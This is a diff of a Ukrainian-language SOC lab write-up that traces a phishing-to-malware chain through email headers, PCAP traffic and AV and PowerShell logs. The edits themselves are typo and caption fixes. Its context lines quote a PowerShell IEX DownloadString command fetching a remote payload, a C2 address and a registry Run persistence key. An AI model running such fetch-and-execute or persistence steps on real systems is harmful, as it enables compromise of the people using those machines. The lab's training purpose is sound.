@@ -74,10 +74,12 @@ Authentication-Results: mx.techfrontier.com.ua;
 
 ![Скріншот — Raw Headers](image/image_4.png)
 ---
-Скріншот — вмист вовідомленя з вкладеним документом
+Скріншот — вміст повідомлення з вкладеним документом
 
 ### Крок 1.4 — Глибокий аналіз .eml
+
 > 📖 [Повна інструкція з інструментами](email_analysis_lab_1.4.md)
+
 ## Фаза 2 — Аналіз мережевого трафіку (PCAP)
 
 ### Крок 2.1 — Підготовка PCAP
@@ -140,8 +142,9 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -A port 80 | grep -i "excel\|office\
 User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.17126; Pro)
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; PowerShell/5.1.19041.4648)
 ```
-![Скріншот — Скріншот — два рядки User-Agent виділені](image/image_9.png)
+![Скріншот — два рядки User-Agent виділені](image/image_9.png)
 Скріншот — два рядки User-Agent виділені
+
 ### Крок 2.5 — Переглянути payload
 
 ```bash
@@ -178,6 +181,7 @@ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/7.0)
 tcpdump -r /home/analyst/scenario/sc06.pcap -A host 185.156.72.11 | grep "POST /cdn/check"
 ```
 ![Скріншот — Підрахувати beacon](image/image_12.png)
+
 **Висновок Фази 2:** 8 C2 beacon (~120с інтервал) до `185.156.72.11:8080`. Спроба ексфільтрації — HTTP 403.
 
 ---
@@ -215,8 +219,8 @@ IEX($wc.DownloadString('http://cdn-updates-service.com/invoices/get_payload.ps1'
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSvcHost
 Value: C:\Users\o.koval\AppData\Local\Temp\svchost_helper.dll
 ```
-![Скріншот — Скріншот av_alerts.log](image/image_13.png)
-![Скріншот — Скріншот av_alerts.log](image/image_14.png)
+![Скріншот av_alerts.log](image/image_13.png)
+![Скріншот av_alerts.log](image/image_14.png)
 Скріншот av_alerts.log — виділені MACRO-XLSM та PERSIST-REGISTRY-RUN
 
 ### Крок 3.3 — PowerShell Transcript
@@ -259,7 +263,7 @@ cat /var/log/web/access.log
 ```
 ![Скріншот — access.log](image/image_16.png)
 ![Скріншот — access.log](image/image_17.png)
-[[Скріншот access.log — IOC рядки виділені серед легітимних запитів]]
+Скріншот access.log — IOC рядки виділені серед легітимних запитів
 
 **Висновок Фази 3:** Підтверджено повний ланцюг: email → XLSM → cmd → PowerShell → DLL → Registry Run → Mutex → beacon ×8 → exfil (blocked).
 
@@ -329,7 +333,6 @@ Host:     Mutex: Local\WinSvcHostV2
 ```bash
 # Ctrl+O → Enter → Ctrl+X
 ```
-
 
 ---
 
